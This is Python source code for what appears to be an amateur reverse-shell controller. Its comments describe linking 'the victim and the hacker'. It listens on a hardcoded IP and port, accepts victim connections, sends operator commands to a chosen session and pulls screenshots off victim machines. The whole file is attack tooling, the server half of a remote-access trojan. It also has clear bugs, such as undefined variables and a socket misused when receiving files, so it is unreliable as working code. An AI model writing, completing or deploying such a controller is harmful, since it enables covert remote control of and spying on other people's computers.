#this code make a connection between the victim and the hacker
#this just the first  version
'''setting colors'''
g = "\033[32m"
c = "\033[36m"
v = "\033[35m"
y = "\033[33m"
r = "\033[31m"
none = "\033[0m"
'''importing the modules'''
import socket
import threading
import queue
import sys , os , time
from tabulate import *
import tqdm
from server_host.tool import *
#from tool import help_menu
'''setting the variabeles'''
NUMBER_OF_THREAD = 2
JOB_NUMBER = [1 , 2]
queue = queue.Queue()
all_connection = []
address_connection = []
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
host = "192.168.1.41"
port = 5050
SEPARATOR = "<SEPARATOR>"
''' setting a socket creating'''
def connection_info():
	try:
		global host
		global port 
		global s
	except s.error as error:
		print(f"\n  {c}[{y}!{c}] {y}there was an error in creating a socket {v}>> {r}{error}{none}")
'''binding the conection'''
def connection_bind():
	try:
		global host 
		global port
		global s
		print(f"\n  {c}[{g}+{c}] {v}binding connection to the port {r}>> {y}{port}")
		s.bind((host , port))
		s.listen(5)
		print(f"\n  {c}[{g}!{c}] {g}binding was completed")
	except socket.error as error:
		print(f"  {c}[{r}-{c}] {y}Binding error {v}>> {r}{error}")
		time.sleep(1)
		print(f"  {c}[{r}!{c}] {y}Retrying ...")
		return connection_bind()
'''accepting the connections'''
def conection_accept():
	for i in all_connection:
		i.close()
	del all_connection[:]
	del address_connection[:]
	while True:
		try:
			conn , address = s.accept()
			conn.setblocking(1)
			all_connection.append(conn)
			address_connection.append(address)
			print(f"\n  {c}[{g}+{c}] {g}Connection have ben accepted {y}IP{r} :{v} {address_connection[0]} {y}PORT{r} :{v} {str(address_connection[1])}")
			continue
		except:
			print(f"\n  {c}[{r}-{c}] {y}Faild to accept the connection")
'''creating a shell intarface'''
def intarface():
	while True:
		op_listen = input(f"\n {c}${y}S{r}-{y}T{r}session{v}>> {g}")
		if op_listen == "clear":
			os.system("clear")
		elif op_listen == "exit":
			s.close()
			sys.exit()
		elif op_listen[0:] == "connect":
			session_connect(op_listen)
		elif op_listen == "help":
			help_menu_session()
		else:
			print(f"  {c}[{r}!{c}] {y}command not find {r}:{v} {op_listen}")
'''creating a list os every session'''
def session_list():
	result = ""
	for i , conn in enumerate(address_connection):
		try:
			msg = ""
			s.send(str(msg).encode("utf-8"))
			s.recv(1024)
		except socket.error as error:
			del all_connection[i]
			del address_connection[0]
		result = f"{y}session number" + f"{y}IP",f"{y}PORT" + f"{r}{str(i)}" + f"{r}{address_connection[i][0]}" + f"{r}{address_connection[i][1]}"
	print(tabulate(result, headers="firstrow",tablefmt="fancy_grid"))
	#print(str(address_connection[i][0:]))
'''connecting to the targets'''
def session_connect(op_listen):
	try:
		print(f"  {c}[{g}!{c}] {y}Trying to connecting to {v}>> {r} {str(address_connection[0:])}")
		time.sleep(1)
		target = op_listen.replace("connect"," ")
		target = int(target)
		conn = all_connection[target]
		time.sleep(2)
		print(f"  {c}[{g}+{c}] {g} you are now connected to {v}>>{r} {address_connection[0]}",end="")
	except s.error as error:
		print(f"  {c}[{r}-{c}] {y}Could not to connect to  {v}>> {r}{address_connection[0]}")
'''sending commands to the victim'''
def send_command():
	while True:
		try:
			msg_command = input(f"  {c}${r}> {g}")
			if msg_command == "quit session":
				break
			if len(str.encode(msg_command)):
				conn.send(str.encode(msg_command))
				client_response = str(conn.recv(1024), "utf-8")
				print(client_response, end="")
			if msg_command[0:] == "screenshot":
				img = s.recv(1024).decode("utf-8")
				img_name , img_size = img.split(SEPARATOR)
				img_name = os.path.basename(img_name)
				img_size = int(img_size)
				progress = tqdm.tqdm(range(img_size), f"{c}[{g}!{c}] {y}Receiving {img_name}", unit="B", unit_scale=True, unit_divisor=1024)
				with open(img_name,"wb") as i :
					while True:
						bytes_reads = s.recv(1024)
						if not bytes_reads:
							break
						i.write(bytes_reads)
						i.close()
						progress.update(len(bytes_reads))

		except:
			print(f"  {c}[{r}?{c}] {y}Connection lost to the target")
			break
'''creat some thread'''
def workers():
	for _ in range(NUMBER_OF_THREAD):
		t = threading.Thread(target=work)
		t.daemon = True
		t.start()
'''creat queue work'''
def work():
	while True:
		x = queue.get()
		if x == 1:
			connection_info()
			connection_bind()
			conection_accept()
		elif x == 2:
			intarface()
		queue.task_done()
'''jobs for threads'''
def jobs():
	for x in JOB_NUMBER	:
		queue.put(x)
	queue.join()
'''executing all this function'''
def reverse_shell_exec():
	workers()
	jobs()
